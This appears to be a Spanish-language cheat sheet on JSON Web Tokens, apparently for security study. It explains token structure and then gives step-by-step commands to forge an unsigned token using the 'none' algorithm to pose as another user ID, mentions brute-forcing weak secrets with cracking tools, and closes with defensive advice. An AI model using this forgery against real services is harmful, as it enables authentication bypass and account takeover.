-- - 

---

### 🔐 **JSON Web Token (JWT) Cheat Sheet**  

---

#### 🧩 **¿Qué son los JWT?**  
Los JWT están compuestos por **3 partes**, separadas por puntos:  
1. 📝 **Header** → Algoritmo & Tipo de Token  
2. 💾 **Payload** → Datos (información del usuario u otros claims)  
3. 🔑 **Signature** → Verificación de la firma  

#### 🗝️ **Ejemplo de JWT:**  
```
1(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9).2(eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ).3(SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c)

```

#### 📌 **Nota:**  
Los JWT están codificados en **Base64**, lo que permite **decodificarlos fácilmente** usando la web oficial `jwt.io` o directamente desde la terminal.

---

## 🚨 **Posibles vulnerabilidades en el uso de JWT**

---

### 🛑 **1. Algoritmo "None" y Sin Firma**  
Algunas aplicaciones permiten el uso de `alg: "NONE"`, lo que permite **omitir la firma**.  

#### 🔥 **Generación del Header:**
```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64
# Resultado: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=
```

#### 🔥 **Generación del Payload:**
```bash
echo -n '{"id":2,"iat":1724327756,"exp":1724331356}' | base64
# Resultado: eyJpZCI6MiwiaWF0IjoxNzI0MzI3NzU2LCJleHAiOjE3MjQzMzEzNTZ9
```

#### 💣 **Construcción del JWT:**
```
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNzI0MzI3NzU2LCJleHAiOjE3MjQzMzEzNTZ9.
```

---

### ⚠️ **Nota Importante:**  
1. **Borra el símbolo `=` del final de cada cadena Base64.**  
2. **Agrega un punto (`.`) al final de las cadenas unidas.**  

---

### 💥 **2. Ataque de Fuerza Bruta al Secreto**  
Otro enfoque es **adivinar el secreto** mediante fuerza bruta.  
Aunque no siempre es factible, en algunos casos donde el secreto es débil o conocido, podría funcionar.  
- Herramientas comunes: `JWT-Tool`, `John the Ripper`, `hashcat`.  
- En general, no es práctico debido al tiempo que requiere para secretos robustos.  

---

💡 **Recomendación:**  
- **Evita el uso de `alg: "NONE"`.**  
- **Utiliza secretos fuertes y complejos.**  
- **Implementa mecanismos de rotación de tokens y vencimiento corto.**  

---
